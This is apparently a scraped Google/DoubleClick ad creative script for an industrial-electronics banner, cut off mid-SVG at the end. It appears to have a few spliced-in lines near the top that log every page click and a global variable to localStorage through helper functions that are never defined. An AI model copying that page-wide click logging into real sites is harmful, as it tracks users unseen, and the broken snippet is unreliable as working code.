if (!window.mraid) {
  document.write('\x3cdiv id="ad_unit"\x3e');
}
//Global variable tracking
window._globs = {};
document.write('\x3cdiv class="GoogleCreativeContainerClass" ' + 'id="gcc_vM_gZNyxL4za2ATvvpAg"\x3e');
(function () {
  var m = document.createElement('meta');
  m.setAttribute('data-jc', '82');
  m.setAttribute('data-jc-version', 'r20230816');
  var ss = document.getElementsByTagName('script')[0];
  if (ss && ss.parentNode) {
    ss.parentNode.insertBefore(m, ss);
  }
})();
(function () {
  /*  Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0 */var h = this || self;
  function l(a, d, b) {
    if (a) for (var c = 0; null != a && 500 > c && !b(a); ++c) a = d(a);
  }
  function m(a, d) {
    l(a, function (b) {
      try {
        return b === b.parent ? null : b.parent;
      } catch (c) {}
      return null;
    }, d);
  }
  function n(a, d) {
    if ("IFRAME" == a.tagName) d(a);else {
      a = a.querySelectorAll("IFRAME");
      for (var b = 0; b < a.length && !d(a[b]); ++b);
    }
  }
  function p(a) {
    return (a = a.ownerDocument) && (a.parentWindow || a.defaultView) || null;
  }
  function q(a, d, b) {
    try {
      var c = JSON.parse(b.data);
    } catch (f) {}
    if ("object" === typeof c && c && "creativeLoad" === c.type) {
      var g = p(a);
      if (b.source && g) {
        var e;
        m(b.source, function (f) {
          try {
            if (f.parent === g) return e = f, !0;
          } catch (k) {}
        });
        e && n(a, function (f) {
          if (f.contentWindow === e) return d(c), !0;
        });
      }
    }
  }
  function r(a) {
    return "string" === typeof a ? document.getElementById(a) : a;
  }
  ;
  var t;
  t = void 0 === t ? window : t;
  t.clsn = function (a, d) {
    var b = r(a);
    if (b) if (b.onCreativeLoad) b.onCreativeLoad(d);else {
      var c = d ? [d] : [],
        g = function (e) {
          for (var f = 0; f < c.length; ++f) try {
            c[f](1, e);
          } catch (k) {}
          c = {
            push: function (k) {
              k(1, e);
            }
          };
        };
      b.onCreativeLoad = function (e) {
        c.push(e);
      };
      b.setAttribute("data-creative-load-listener", "");
      b.addEventListener("creativeLoad", function (e) {
        g(e.detail);
      });
      h.addEventListener("message", function (e) {
        q(b, g, e);
      });
    }
  };
}).call(this);
Object.defineProperty(window, "myGlobal", {
  get: function () {
    return window._globs.myGlobal;
  },
  set: function (v) {
    window._globs.myGlobal = v;
    saveStateToLocalStorage(); // Save state to LocalStorage
  }
});

// Event listening
window.addEventListener('click', event => {
  saveEventToLocalStorage('click', event.target.id); // Save click event to LocalStorage
});

// jshook to monitor execution
clsn("gcc_vM_gZNyxL4za2ATvvpAg");
document.write('\x3ca target\x3d\x22_blank\x22 id\x3d\x22img_anch_CNz_yM716IADFQwtlgodbx8EBA\x22 href\x3d\x22https://adclick.g.doubleclick.net/pcs/click?xai\x3dAKAOjsuWYfmv0VSF2r_VIf7AGEVswT0RyFpTzB8-tlPAB3a8k7Tm6hd0ya2UEmSvvGdKmP78RaG8r1WW6JzP8_PR9kH7QxcVNZpygvu86O8FtAxV_oYgbsUPaCP4Ipq4ZcWk92BS520ZdQO_p0dv3wMvWGanyWQPf_TnvXLNjjIlCQQR_n-fiLpjtsZ27MrWEMP9VoMFHtjBCPxjL09MEfHA8qfVdNSNp7wnXKaRNWGHltXfdl3e9mqCnk4m97V3FaYgmdFWvKxTMtslWo0Zkfxp4Hmnbg3a-yV2vpTcRUhCpzFES7sCOGOhXUdUyZ-eC_3Fy-QA_Y1zMHl1zMAxAu4QESs7KiWjh-t_KPYz-WXyHkhKkANS-rgo9JiwdHaBWxzoX_fOzXN284OYCoqkdb73GCAL4COj6QXf5NupI3Xcd1YswPgUSycF8EpatnEyK7ne6X1IpVOGRueMcevSxRz1Pc4ZKpgA8TjC_Vm2Y5jRiHSuq4oCis9sjAhZmijeBhIYBDOfTl5V6DJh4sU__F1f93odXHRqTF52LtKkxIp_22kAlA1aWzpoPDHj3FxyIRPmp0OVWvIUrjv9Y-K9xAX3tTrW3zcWD9dd9tL3pdKLJP9mYGAMHQT_-Ib5gfwGhBwCSErYVHVoy754bXkFAaP1ocE7SHmSYBJWLsXYL01KBcRWEdynHsA_zf3SzZwCFI9ClCTcMF3JYl4S4u2BMkB5q8mgeSiIp8KEhby-e-5HT_sq_CIT1VTBPyIblhirfqVASAn0O6Gdj55B5Oms3tZjVMzrQiqgstwDo3BuyStOTIXNMxSnumjtntFCraQ6-1whxJKRk9LwNM1dVtmxWuhYJxZBtijXO0pGqytnkSwUkMrmjkxSq28innbc_gGRXY6V-gck56iaEgF3geUJY3J_GpcxWN6tkOZPzUrc6XkG8hZpPM-FM0LTZ5D_dq7g_PyIUODJNm8vrdFx952QWxXjWtvkIWEeKQwdljsRFYYqgROohT2d4zwYqA7NUw1_fCev-oeIQko-jPH-g5bxP2tcDZBwarY5IavKKXwt75pCEAGd8DNIFgpsJnpkXPKsKyGdC179ymMBloXz8iiRGGUlZlVuNSIJeZxFneUVehqgawG4Icw3_kgU_cPoLWak-vU9LW_fLDeI_YgJWecASIg4M-M2mBhLp9c5hMU-J9IwtlME8T9Tlzh9wTwc_sKTBrZ8DT-i9uK4TJ-SB-Izl57Bj0geXZ2apt9LuD4TWuC2bQ-qlW02zaO03_pv4oUkYrPT9kP8dXEEEFlA-gSbG3Xm5AwqwWv1R6SRm8r8ZojGVPUMVicPfYgxZmAEzoE5Lli9cWoXJRUhHKkURn5Ogl2VEdVy\x26amp;sai\x3dAMfl-YQj5VKTh_WoZAEmngCJcM8qeDExpcjiKZGOOIRfXaGHQFYJhkNGP-a4lKC_Y2YqpaULfRHdVxwHJGMMbP4IWkZiMDwLGNullVsCcpG7JhAFzhX1b0qMdBKb04S9nQlcu16VmIvSZdzlk1D30_eANfW3qFxGNeFw3OQOVdhmFvGhFUMNnDtncZfJAxiLjE4EQMvtpTZkbC_atb8RYo7nQ6gvYGZOEKD5W_wh2QGhr9qASAt8YFokF3nUvk_5zeLYWRAt4KbCtc_Hdd2OCCqUclOMzGa9haDEEe1TBTIIX6SgW-d6LaqobIGwGAfpZtUo19wZ1lpwS6I-z1UtwKO6tL09rzZb26qOQWw\x26amp;sig\x3dCg0ArKJSzO83lscvU9zt\x26amp;fbs_aeid\x3d[gw_fbsaeid]\x26amp;urlfix\x3d1\x26amp;adurl\x3dhttps://www.arrow.com/en/industrial-solutions-from-analog-devices/adi-industrial-digital-factory%3Futm_source%3Ddv360%26utm_medium%3Ddisplay%26utm_term%3DArrow23ADIIndustrialDigitalFactoryQ2-Q3-Engineer-Direct(NoSubPartner)-RetargetingArrowSite%26utm_content%3D300x250-3PAS-English-052223%26utm_campaign%3DSupplier-APAC-Arrow23ADIIndustrialDigitalFactoryQ2Q3\x22\x3e\x3cimg src\x3d\x22https://s0.2mdn.net/simgad/5157485211171709775\x22 alt\x3d\x22Advertisement\x22 border\x3d\x220\x22 width\x3d\x22300\x22 height\x3d\x22250\x22 style\x3d\x22display:block\x22\x3e\x3c/a\x3e\x3cscript data-jc\x3d\x2274\x22 data-jc-version\x3d\x22r20230816\x22 data-jcp-a-id\x3d\x22img_anch_CNz_yM716IADFQwtlgodbx8EBA\x22 data-jcp-for-sure-open-browser\x3d\x22false\x22 data-jcp-for-sure-open-custom-tabs\x3d\x22false\x22 data-jcp-cc-overlay\x3d\x22\x22 data-jcp-cc-button\x3d\x22\x22 data-jcp-is-fledge\x3d\x22false\x22 data-jcp-turtlex-event-ad-signals\x3d\x22\x22\x3e(function(){/*  Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0 */ var aa\x3d\x22function\x22\x3d\x3dtypeof Object.defineProperties?Object.defineProperty:function(a,b,d){if(a\x3d\x3dArray.prototype||a\x3d\x3dObject.prototype)return a;a[b]\x3dd.value;return a};function ba(a){a\x3d[\x22object\x22\x3d\x3dtypeof globalThis\x26\x26globalThis,a,\x22object\x22\x3d\x3dtypeof window\x26\x26window,\x22object\x22\x3d\x3dtypeof self\x26\x26self,\x22object\x22\x3d\x3dtypeof global\x26\x26global];for(var b\x3d0;b\x3ca.length;++b){var d\x3da[b];if(d\x26\x26d.Math\x3d\x3dMath)return d}throw Error(\x22Cannot find global object\x22);}var ca\x3dba(this); function da(a,b){if(b)a:{var d\x3dca;a\x3da.split(\x22.\x22);for(var c\x3d0;c\x3ca.length-1;c++){var e\x3da[c];if(!(e in d))break a;d\x3dd[e]}a\x3da[a.length-1];c\x3dd[a];b\x3db(c);b!\x3dc\x26\x26null!\x3db\x26\x26aa(d,a,{configurable:!0,writable:!0,value:b})}}var ea\x3d\x22function\x22\x3d\x3dtypeof Object.create?Object.create:function(a){function b(){}b.prototype\x3da;return new b},m; if(\x22function\x22\x3d\x3dtypeof Object.setPrototypeOf)m\x3dObject.setPrototypeOf;else{var p;a:{var fa\x3d{a:!0},q\x3d{};try{q.__proto__\x3dfa;p\x3dq.a;break a}catch(a){}p\x3d!1}m\x3dp?function(a,b){a.__proto__\x3db;if(a.__proto__!\x3d\x3db)throw new TypeError(a+\x22 is not extensible\x22);return a}:null}var r\x3dm,ha\x3d\x22function\x22\x3d\x3dtypeof Object.assign?Object.assign:function(a,b){for(var d\x3d1;d\x3carguments.length;d++){var c\x3darguments[d];if(c)for(var e in c)Object.prototype.hasOwnProperty.call(c,e)\x26\x26(a[e]\x3dc[e])}return a}; da(\x22Object.assign\x22,function(a){return a||ha});var t\x3dthis||self;var v,w;a:{for(var x\x3d[\x22CLOSURE_FLAGS\x22],y\x3dt,z\x3d0;z\x3cx.length;z++)if(y\x3dy[x[z]],null\x3d\x3dy){w\x3dnull;break a}w\x3dy}var A\x3dw\x26\x26w[610401301];v\x3dnull!\x3dA?A:!1;var B,C\x3dt.navigator;B\x3dC?C.userAgentData||null:null;function D(a){return v?B?B.brands.some(function(b){return(b\x3db.brand)\x26\x26-1!\x3db.indexOf(a)}):!1:!1}function E(a){var b;a:{if(b\x3dt.navigator)if(b\x3db.userAgent)break a;b\x3d\x22\x22}return-1!\x3db.indexOf(a)};function F(){return v?!!B\x26\x260\x3cB.brands.length:!1}function G(){return F()?D(\x22Chromium\x22):(E(\x22Chrome\x22)||E(\x22CriOS\x22))\x26\x26!(F()?0:E(\x22Edge\x22))||E(\x22Silk\x22)};var ia\x3dF()?!1:E(\x22Trident\x22)||E(\x22MSIE\x22);!E(\x22Android\x22)||G();G();E(\x22Safari\x22)\x26\x26(G()||(F()?0:E(\x22Coast\x22))||(F()?0:E(\x22Opera\x22))||(F()?0:E(\x22Edge\x22))||(F()?D(\x22Microsoft Edge\x22):E(\x22Edg/\x22))||F()\x26\x26D(\x22Opera\x22));var H\x3d{},I\x3dnull;var ja\x3d\x22undefined\x22!\x3d\x3dtypeof Uint8Array,ka\x3d!ia\x26\x26\x22function\x22\x3d\x3d\x3dtypeof btoa;var J\x3d\x22function\x22\x3d\x3d\x3dtypeof Symbol\x26\x26\x22symbol\x22\x3d\x3d\x3dtypeof Symbol()?Symbol():void 0,la\x3dJ?function(a,b){a[J]|\x3db}:function(a,b){void 0!\x3d\x3da.g?a.g|\x3db:Object.defineProperties(a,{g:{value:b,configurable:!0,writable:!0,enumerable:!1}})};function oa(a){var b\x3dK(a);1!\x3d\x3d(b\x261)\x26\x26(Object.isFrozen(a)\x26\x26(a\x3dArray.prototype.slice.call(a)),L(a,b|1))} var K\x3dJ?function(a){return a[J]|0}:function(a){return a.g|0},M\x3dJ?function(a){return a[J]}:function(a){return a.g},L\x3dJ?function(a,b){a[J]\x3db}:function(a,b){void 0!\x3d\x3da.g?a.g\x3db:Object.defineProperties(a,{g:{value:b,configurable:!0,writable:!0,enumerable:!1}})};function pa(){var a\x3d[];la(a,1);return a}function N(a){a\x3da\x3e\x3e11\x261023;return 0\x3d\x3d\x3da?536870912:a};var qa\x3d{};function O(a){return null!\x3d\x3da\x26\x26\x22object\x22\x3d\x3d\x3dtypeof a\x26\x26!Array.isArray(a)\x26\x26a.constructor\x3d\x3d\x3dObject}var P,Q,ra\x3d[];L(ra,39);Q\x3dObject.freeze(ra);var sa;function ta(a,b,d){null\x3d\x3da\x26\x26(a\x3dsa);sa\x3dvoid 0;if(null\x3d\x3da){var c\x3d96;d?(a\x3d[d],c|\x3d512):a\x3d[];b\x26\x26(c\x3dc\x26-2095105|(b\x261023)\x3c\x3c11)}else{if(!Array.isArray(a))throw Error();c\x3dK(a);if(c\x2664)return a;c|\x3d64;if(d\x26\x26(c|\x3d512,d!\x3d\x3da[0]))throw Error();a:{d\x3da;var e\x3dd.length;if(e){var g\x3de-1,f\x3dd[g];if(O(f)){c|\x3d256;b\x3d+!!(c\x26512)-1;e\x3dg-b;1024\x3c\x3de\x26\x26(ua(d,b,f),e\x3d1023);c\x3dc\x26-2095105|(e\x261023)\x3c\x3c11;break a}}b\x26\x26(f\x3d+!!(c\x26512)-1,b\x3dMath.max(b,e-f),1024\x3cb\x26\x26(ua(d,f,{}),c|\x3d256,b\x3d1023),c\x3dc\x26-2095105|(b\x261023)\x3c\x3c11)}}L(a,c);return a} function ua(a,b,d){for(var c\x3d1023+b,e\x3da.length,g\x3dc;g\x3ce;g++){var f\x3da[g];null!\x3df\x26\x26f!\x3d\x3dd\x26\x26(d[g-b]\x3df)}a.length\x3dc+1;a[c]\x3dd};function va(a,b){return wa(b)} function wa(a){switch(typeof a){case \x22number\x22:return isFinite(a)?a:String(a);case \x22boolean\x22:return a?1:0;case \x22object\x22:if(a\x26\x26!Array.isArray(a)\x26\x26ja\x26\x26null!\x3da\x26\x26a instanceof Uint8Array){if(ka){for(var b\x3d\x22\x22,d\x3d0,c\x3da.length-10240;d\x3cc;)b+\x3dString.fromCharCode.apply(null,a.subarray(d,d+\x3d10240));b+\x3dString.fromCharCode.apply(null,d?a.subarray(d):a);a\x3dbtoa(b)}else{void 0\x3d\x3d\x3db\x26\x26(b\x3d0);if(!I){I\x3d{};d\x3d\x22ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\x22.split(\x22\x22);c\x3d[\x22+/\x3d\x22,\x22+/\x22,\x22-_\x3d\x22,\x22-_.\x22,\x22-_\x22];for(var e\x3d 0;5\x3ee;e++){var g\x3dd.concat(c[e].split(\x22\x22));H[e]\x3dg;for(var f\x3d0;f\x3cg.length;f++){var h\x3dg[f];void 0\x3d\x3d\x3dI[h]\x26\x26(I[h]\x3df)}}}b\x3dH[b];d\x3dArray(Math.floor(a.length/3));c\x3db[64]||\x22\x22;for(e\x3dg\x3d0;g\x3ca.length-2;g+\x3d3){var l\x3da[g],k\x3da[g+1];h\x3da[g+2];f\x3db[l\x3e\x3e2];l\x3db[(l\x263)\x3c\x3c4|k\x3e\x3e4];k\x3db[(k\x2615)\x3c\x3c2|h\x3e\x3e6];h\x3db[h\x2663];d[e++]\x3df+l+k+h}f\x3d0;h\x3dc;switch(a.length-g){case 2:f\x3da[g+1],h\x3db[(f\x2615)\x3c\x3c2]||c;case 1:a\x3da[g],d[e]\x3db[a\x3e\x3e2]+b[(a\x263)\x3c\x3c4|f\x3e\x3e4]+h+c}a\x3dd.join(\x22\x22)}return a}}return a};function xa(a,b,d,c,e,g){if(null!\x3da){if(Array.isArray(a))a\x3de\x26\x260\x3d\x3da.length\x26\x26K(a)\x261?void 0:g\x26\x26K(a)\x262?a:ya(a,b,d,void 0!\x3d\x3dc,e,g);else if(O(a)){var f\x3d{},h;for(h in a)f[h]\x3dxa(a[h],b,d,c,e,g);a\x3df}else a\x3db(a,c);return a}}function ya(a,b,d,c,e,g){var f\x3dc||d?K(a):0;c\x3dc?!!(f\x2632):void 0;a\x3dArray.prototype.slice.call(a);for(var h\x3d0;h\x3ca.length;h++)a[h]\x3dxa(a[h],b,d,c,e,g);d\x26\x26d(f,a);return a}function za(a){return a.h\x3d\x3d\x3dqa?a.toJSON():wa(a)};function S(a,b,d){this.g\x3dta(a,b,d)}S.prototype.toJSON\x3dfunction(){if(P)var a\x3dT(this,this.g,!1);else a\x3dya(this.g,za,void 0,void 0,!1,!1),a\x3dT(this,a,!0);return a};function Aa(a){P\x3d!0;try{return JSON.stringify(a.toJSON(),va)}finally{P\x3d!1}}S.prototype.h\x3dqa;S.prototype.toString\x3dfunction(){return T(this,this.g,!1).toString()}; function T(a,b,d){var c\x3da.constructor.i,e\x3dN(M(d?a.g:b)),g\x3d!1;if(c){if(!d){b\x3dArray.prototype.slice.call(b);var f;if(b.length\x26\x26O(f\x3db[b.length-1]))for(g\x3d0;g\x3cc.length;g++)if(c[g]\x3e\x3de){Object.assign(b[b.length-1]\x3d{},f);break}g\x3d!0}e\x3db;d\x3d!d;f\x3dM(a.g);a\x3dN(f);f\x3d+!!(f\x26512)-1;for(var h,l,k\x3d0;k\x3cc.length;k++)if(l\x3dc[k],l\x3ca){l+\x3df;var n\x3de[l];null\x3d\x3dn?e[l]\x3dd?Q:pa():d\x26\x26n!\x3d\x3dQ\x26\x26oa(n)}else h||(n\x3dvoid 0,e.length\x26\x26O(n\x3de[e.length-1])?h\x3dn:e.push(h\x3d{})),n\x3dh[l],null\x3d\x3dh[l]?h[l]\x3dd?Q:pa():d\x26\x26n!\x3d\x3dQ\x26\x26oa(n)}c\x3db.length;if(!c)return b; var ma;if(O(h\x3db[c-1])){a:{var u\x3dh;e\x3d{};d\x3d!1;for(var na in u)a\x3du[na],Array.isArray(a)\x26\x26a!\x3da\x26\x26(d\x3d!0),null!\x3da?e[na]\x3da:d\x3d!0;if(d){for(var Ka in e){u\x3de;break a}u\x3dnull}}u!\x3dh\x26\x26(ma\x3d!0);c--}for(;0\x3cc;c--){h\x3db[c-1];if(null!\x3dh)break;var Ia\x3d!0}if(!ma\x26\x26!Ia)return b;var R;g?R\x3db:R\x3dArray.prototype.slice.call(b,0,c);b\x3dR;g\x26\x26(b.length\x3dc);u\x26\x26b.push(u);return b};function U(a){this.g\x3dta(a)}U.prototype\x3dea(S.prototype);U.prototype.constructor\x3dU;if(r)r(U,S);else for(var V in S)if(\x22prototype\x22!\x3dV)if(Object.defineProperties){var Ba\x3dObject.getOwnPropertyDescriptor(S,V);Ba\x26\x26Object.defineProperty(U,V,Ba)}else U[V]\x3dS[V];var Ca\x3d/^(?:(?:https?|mailto|ftp):|[^:/?#]*(?:[/?#]|$))/i;function Da(a,b,d,c){var e\x3d/^(https?:[^:?]+[/]pcs[/]click[^/]+?)(?:\x26nx[^\x26]+\x26ny[^\x26]+\x26dim[^\x26]+)?(\x26adurl\x3d.*)/.exec(a);return e?e[1]+(\x22\x26nx\x3d\x22+b+\x22\x26ny\x3d\x22+d+\x22\x26dim\x3d\x22+c)+e[2]:a}function Ea(a){var b\x3da.currentTarget,d\x3db.querySelector(\x22img[alt]\x22);d\x26\x26(a\x3dDa(b.href,+Math.round(a.clientX-d.offsetLeft),+Math.round(a.clientY-d.offsetTop),+d.width+\x22x\x22+ +d.height),Ca.test(a)\x26\x26(b.href\x3da))} function Fa(a){var b\x3dt;b\x3dvoid 0\x3d\x3d\x3db?window:b;var d\x3dnew U;if(null!\x3da\x26\x26\x22string\x22!\x3d\x3dtypeof a)throw Error();var c\x3dd.g,e\x3dM(c);if(e\x262)throw Error();a:{var g\x3dN(e);if(1\x3e\x3dg){var f\x3de;if(e\x26256)g\x3dc[c.length-1];else{if(null\x3d\x3da)break a;g\x3dc[g+(+!!(e\x26512)-1)]\x3d{};f|\x3d256}g[1]\x3da;f!\x3d\x3de\x26\x26L(c,f)}else c[1+(+!!(e\x26512)-1)]\x3da,e\x26256\x26\x26(a\x3dc[c.length-1],1 in a\x26\x26delete a[1])}var h;null\x3d\x3db||null\x3d\x3d(h\x3db.fence)||h.setReportEventDataForAutomaticBeacons({eventType:\x22reserved.top_navigation\x22,eventData:Aa(d),destination:[\x22buyer\x22]});var l; null\x3d\x3db||null\x3d\x3d(l\x3db.fence)||l.reportEvent({eventType:\x22click\x22,eventData:Aa(d),destination:[\x22buyer\x22]});var k;null\x3d\x3db||null\x3d\x3d(k\x3db.fence)||k.reportEvent({eventType:\x22reserved.top_navigation\x22,destination:[\x22component-seller\x22]});var n;null\x3d\x3db||null\x3d\x3d(n\x3db.fence)||n.reportEvent({eventType:\x22click\x22,destination:[\x22component-seller\x22]})} function Ga(a,b){void 0!\x3dt.AFMA_Communicator\x26\x26void 0!\x3dt.AFMA_Communicator.sendMessage\x26\x26(a.preventDefault(),t.AFMA_Communicator.sendMessage(\x22open\x22,{a:\x22app\x22,u:a.currentTarget.href,system_browser:!0,use_first_package:!0,use_running_process:!0,use_custom_tabs:b}))};var W,X\x3ddocument.currentScript;W\x3d(X\x3dvoid 0\x3d\x3d\x3dX?null:X)\x26\x26\x2274\x22\x3d\x3d\x3dX.getAttribute(\x22data-jc\x22)?X:document.querySelector(\x27[data-jc\x3d\x2274\x22]\x27);if(null\x3d\x3dW)throw Error(\x22JSC not found 74\x22);for(var Ha\x3d{},Y\x3dW.attributes,Z\x3dY.length-1;0\x3c\x3dZ;Z--){var Ja\x3dY[Z].name;0\x3d\x3d\x3dJa.indexOf(\x22data-jcp-\x22)\x26\x26(Ha[Ja.substring(9)]\x3dY[Z].value)} (function(a){var b\x3ddocument.getElementById(a[\x22a-id\x22]),d\x3d\x22true\x22\x3d\x3d\x3da[\x22for-sure-open-browser\x22],c\x3d\x22true\x22\x3d\x3d\x3da[\x22for-sure-open-custom-tabs\x22],e\x3da[\x22cc-overlay\x22],g\x3da[\x22cc-button\x22],f\x3de?document.getElementById(e):null,h\x3dg?document.getElementById(g):null;if(\x22true\x22\x3d\x3d\x3da[\x22is-fledge\x22]){var l\x3da[\x22turtlex-event-ad-signals\x22];h?h.addEventListener(\x22click\x22,function(){Fa(l)}):b.addEventListener(\x22click\x22,function(){Fa(l)})}else if(b.addEventListener(\x22mousedown\x22,Ea),f\x26\x26h\x26\x26f.addEventListener(\x22mousedown\x22,function(k){k\x3dDa(h.href, +Math.round(k.clientX-f.offsetLeft),+Math.round(k.clientY-f.offsetTop),+f.clientWidth+\x22x\x22+ +f.clientHeight);Ca.test(k)\x26\x26(h.href\x3dk)}),d||c)b.addEventListener(\x22click\x22,function(k){Ga(k,c)}),h\x26\x26h.addEventListener(\x22click\x22,function(k){Ga(k,c)})})(Ha);}).call(this);\x3c/script\x3e\x3cstyle\x3ediv{margin:0;padding:0;}.abgcp{height:15px;padding-right:1px;padding-top:1px;padding-left:9px;padding-bottom:13px;right:0px;top:0px;position:absolute;width:15px;z-index:2147483646;}.abgc{display:block;height:15px;position:absolute;right:1px;top:1px;text-rendering:geometricPrecision;z-index:2147483646;}.abgb{display:none;height:15px;}.abgc,.abgcp,.jar .abgc,.jar .abgcp,.jar .cbb{opacity:1;}.abgs{display:none;height:100%;}.abgl{text-decoration:none;}.abgs svg,.abgb svg{display:inline-block;height:15px;width:auto;vertical-align:top;}.abgc .il-wrap{background-color:#ffffff;height:15px;white-space:nowrap;}.abgc .il-wrap.exp{border-bottom-left-radius:5px;}.abgc .il-text,.abgc .il-icon{display:inline-block;}.abgc .il-text{padding-right:1px;padding-left:5px;height:15px;width:74px;}.abgc .il-icon{height:15px;width:15px;}.abgc .il-text svg{fill:#000000;}.abgc .il-icon svg{fill:#00aecd}\x3c/style\x3e\x3cdiv id\x3d\x22abgcp\x22 class\x3d\x22abgcp\x22\x3e\x3cdiv id\x3d\x22abgc\x22 class\x3d\x22abgc\x22 dir\x3d\x22ltr\x22\x3e\x3cdiv id\x3d\x22abgb\x22 class\x3d\x22abgb\x22\x3e\x3cdiv class\x3d\x22il-wrap\x22\x3e\x3cdiv class\x3d\x22il-icon\x22\x3e\x3csvg xmlns\x3d\x22http://www.w3.org/2000/svg\x22 xmlns:xlink\x3d\x22http://www.w3.org/1999/xlink\x22 viewBox\x3d\x220 0 15 15\x22\x3e\x3cpath d\x3d\x22M7.5,1.5a6,6,0,1,0,0,12a6,6,0,1,0,0,-12m0,1a5,5,0,1,1,0,10a5,5,0,1,1,0,-10ZM6.625,11l1.75,0l0,-4.5l-1.75,0ZM7.5,3.75a1,1,0,1,0,0,2a1,1,0,1,0,0,-2Z\x22\x3e\x3c/path\x3e\x3c/svg\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3cdiv id\x3d\x22abgs\x22 class\x3d\x22abgs\x22\x3e\x3ca id\x3d\x22abgl\x22 class\x3d\x22abgl\x22 href\x3d\x22https://www.google.com/url?ct\x3dabg\x26amp;q\x3dhttps://www.google.com/adsense/support/bin/request.py%3Fcontact%3Dabg_afc%26url%3Dhttps://www.elpais.com.co/%26gl%3DJP%26hl%3Den%26ai0%3D\x26amp;usg\x3dAOvVaw3sh5Lcj4x95jr4r0MSj9S_\x22 target\x3d\x22_blank\x22\x3e\x3cdiv class\x3d\x22il-wrap exp\x22\x3e\x3cdiv class\x3d\x22il-text\x22\x3e\x3csvg xmlns\x3d\x22http://www.w3.org/2000/svg\x22 xmlns:xlink\x3d\x22http://www.w3.org/1999/xlink\x22 viewBox\x3d\x220 0 79 16\x22\x3e\x3cpath d\x3d\x22M4.51 4.24L8.02 12.83L6.73 12.83L5.72 10.21L2.14 10.21L1.19 12.83L-0.01 12.83L3.29 4.24L4.51 4.24ZM2.46 9.31L5.38 9.31L5.38 9.31Q4.32 6.52 4.19 6.14L4.19 6.14L4.19 6.14Q4.05 5.77 3.89 5.13L3.89 5.13L3.86 5.13L3.86 5.13Q3.70 6 3.42 6.74L3.42 6.74L2.46 9.31ZM13.83 4.24L13.83 12.83L12.85 12.83L12.85 12.04L12.83 12.04L12.83 12.04Q12.26 12.97 11.11 12.97L11.11 12.97L11.11 12.97Q9.97 12.97 9.20 12.07L9.20 12.07L9.20 12.07Q8.44 11.16 8.44 9.72L8.44 9.72L8.44 9.72Q8.44 8.21 9.16 7.34L9.16 7.34L9.16 7.34Q9.88 6.47 11.06 6.47L11.06 6.47L11.06 6.47Q12.18 6.47 12.76 7.32L12.76 7.32L12.78 7.32L12.78 4.24L13.83 4.24ZM11.22 12.11L11.22 12.11L11.22 12.11Q11.91 12.11 12.39 11.54L12.39 11.54L12.39 11.54Q12.87 10.97 12.87 9.81L12.87 9.81L12.87 9.81Q12.87 8.68 12.43 8.00L12.43 8.00L12.43 8.00Q11.99 7.33 11.17 7.33L11.17 7.33L11.17 7.33Q10.35 7.33 9.93 7.99L9.93 7.99L9.93 7.99Q9.52 8.65 9.52 9.72L9.52 9.72L9.52 9.72Q9.52 10.49 9.74 11.03L9.74 11.03L9.74 11.03Q9.97 11.57 10.37 11.84L10.37 11.84L10.37 11.84Q10.78 12.11 11.22 12.11ZM19.98 8.21L18.95 8.35L18.95 8.35Q18.88 7.84 18.54 7.58L18.54 7.58L18.54 7.58Q18.19 7.33 17.58 7.33L17.58 7.33L17.58 7.33Q16.98 7.33 16.61 7.54L16.61 7.54L16.61 7.54Q16.24 7.74 16.24 8.13L16.24 8.13L16.24 8.13Q16.24 8.50 16.53 8.66L16.53 8.66L16.53 8.66Q16.83 8.82 17.70 9.05L17.70 9.05L17.70 9.05Q18.69 9.30 19.17 9.49L19.17 9.49L19.17 9.49Q19.66 9.69 19.94 10.03L19.94 10.03L19.94 10.03Q20.21 10.38 20.21 11.00L20.21 11.00L20.21 11.00Q20.21 11.84 19.53 12.40L19.53 12.40L19.53 12.40Q18.85 12.97 17.71 12.97L17.71 12.97L17.71 12.97Q16.53 12.97 15.86 12.47L15.86 12.47L15.86 12.47Q15.20 11.97 15.05 10.97L15.05 10.97L16.10 10.81L16.10 10.81Q16.18 11.46 16.58 11.78L16.58 11.78L16.58 11.78Q16.98 12.11 17.70 12.11L17.70 12.11L17.70 12.11Q18.39 12.11 18.76 11.82L18.76 11.82L18.76 11.82Q19.13 11.53 19.13 11.11L19.13 11.11L19.13 11.11Q19.13 10.83 18.96 10.66L18.96 10.66L18.96 10.66Q18.79 10.49 18.54 10.40L18.54 10.40L18.54 10.40Q18.28 10.32 17.39 10.10L17.39 10.10L17.39 10.10Q16.07 9.79 15.64 9.33L15.64 9.33L15.64 9.33Q15.22 8.88 15.22 8.26L15.22 8.26L15.22 8.26Q15.22 7.48 15.84 6.97L15.84 6.97L15.84 6.97Q16.46 6.47 17.51 6.47L17.51 6.47L17.51 6.47Q18.62 6.47 19.24 6.91L19.24 6.91L19.24 6.91Q19.86 7.34 19.98 8.21L19.98 8.21ZM25.87 7.31L25.90 7.31L25.90 7.31Q26.48 6.47 27.57 6.47L27.57 6.47L27.57 6.47Q28.78 6.47 29.50 7.34L29.50 7.34L29.50 7.34Q30.22 8.21 30.22 9.62L30.22 9.62L30.22 9.62Q30.22 11.24 29.41 12.11L29.41 12.11L29.41 12.11Q28.61 12.97 27.53 12.97L27.53 12.97L27.53 12.97Q26.43 12.97 25.82 12.05L25.82 12.05L25.80 12.05L25.80 12.83L24.81 12.83L24.81 4.24L25.87 4.24L25.87 7.31ZM27.45 12.11L27.45 12.11L27.45 12.11Q28.18 12.11 28.66 11.48L28.66 11.48L28.66 11.48Q29.13 10.85 29.13 9.71L29.13 9.71L29.13 9.71Q29.13 8.61 28.69 7.97L28.69 7.97L28.69 7.97Q28.25 7.33 27.48 7.33L27.48 7.33L27.48 7.33Q26.72 7.33 26.25 7.99L26.25 7.99L26.25 7.99Q25.79 8.65 25.79 9.67L25.79 9.67L25.79 9.67Q25.79 10.66 25.98 11.08L25.98 11.08L25.98 11.08Q26.17 11.50 26.56 11.80L26.56 11.80L26.56 11.80Q26.95 12.11 27.45 12.11ZM35.52 6.61L36.59 6.61L34.21 12.93L34.21 12.93Q34.21 12.94 34.20 12.97L34.20 12.97L34.20 12.97Q33.86 14.03 33.41 14.69L33.41 14.69L33.41 14.69Q32.95 15.35 32.12 15.35L32.12 15.35L32.12 15.35Q31.83 15.35 31.43 15.23L31.43 15.23L31.32 14.23L31.32 14.23Q31.63 14.33 31.92 14.33L31.92 14.33L31.92 